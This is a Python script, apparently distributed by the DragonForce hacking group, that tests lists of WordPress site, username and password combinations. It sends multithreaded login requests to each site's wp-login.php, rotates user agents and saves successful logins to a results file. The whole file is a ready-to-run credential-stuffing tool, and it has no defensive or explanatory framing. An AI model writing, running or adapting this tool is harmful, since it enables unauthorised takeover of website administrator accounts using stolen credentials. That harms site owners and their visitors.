# Author: Pari Malam

import os
import requests
import random
import concurrent.futures
from sys import stdout
from colorama import Fore, init
init(autoreset=True)


FG = Fore.GREEN
FR = Fore.RED
FW = Fore.WHITE
FY = Fore.YELLOW
FC = Fore.CYAN

def dirdar():
    if not os.path.exists('Results'):
        os.mkdir('Results')

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banners():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ \n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL FORUM     "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   DRAGONFORCE.IO                                "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL TELEGRAM  "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   TELEGRAM.ME/DRAGONFORCEIO                     "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
    print(f"{Fore.YELLOW}[Wordpress Login] - {Fore.GREEN}Perform With Wordpress Login Checker")
    print(f"{Fore.RED}[Notes] - {Fore.YELLOW}Format must be {FG}site.com/wp-login|username|password\n")
banners()

def users_agents():
    with open("lib/ua.txt", "r") as ua_file:
        user_agents = ua_file.readlines()
    user_agents = [ua.strip() for ua in user_agents if ua.strip()]
    return random.choice(user_agents)

def URLdomain(url):
    return url.split('/')[0]

def beluga(url, username, password):
    try:
        payload = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': f'https://{url}/wp-admin/',
            'testcookie': '1'
        }
        headers = {
            'User-Agent': users_agents(),
            'Referer': f'https://{url}/wp-login.php'
        }

        response = requests.post(f'https://{url}/wp-login.php', data=payload, headers=headers, timeout=30)

        if response.status_code == 200:
            if 'wp-admin' in response.url:
                print(f"{FY}[Wordpress] - {FG}[W00T!] - {FW}https://{url} - {FC}{username}|{password}")
                with open("Results/Success.txt", "a") as f:
                    f.write(f"[+] URLs: https://{url}/wp-login.php\n[+] Username: {username}\n[+] Password: {password}\n\n")
            elif 'Dashboard' in response.text:  # Change 'Dashboard' to the appropriate keyword on the WordPress dashboard
                print(f"{FY}[Wordpress] - {FG}[W00T!] - {FW}https://{url} - {FC}{username}|{password}")
                with open("Results/Success.txt", "a") as f:
                    f.write(f"[+] URLs: https://{url}/wp-login.php\n[+] Username: {username}\n[+] Password: {password}\n\n")
            else:
                print(f"{FY}[Wordpress] - {FR}[Failed!] - {FW}https://{url} - {FC}{username}|{password}")
        else:
            print(f"{FY}[Wordpress] - {FR}[Failed!] - {FW}https://{url} - {FC}{username}|{password}")
    except:
        pass


def parimalam(meow):
    with open(meow, 'r', encoding='utf-8') as file:
        urls = [line.strip() for line in file if "|" in line]
        with concurrent.futures.ThreadPoolExecutor() as executor:
            for url in urls:
                credentials = url.split("|")
                if len(credentials) == 3:
                    url, username, password = credentials
                    executor.submit(beluga, url, username, password)


def main():
    meow = input(f"{FY}LOGIN LIST: {FW}")
    parimalam(meow)


if __name__ == '__main__':
    main()
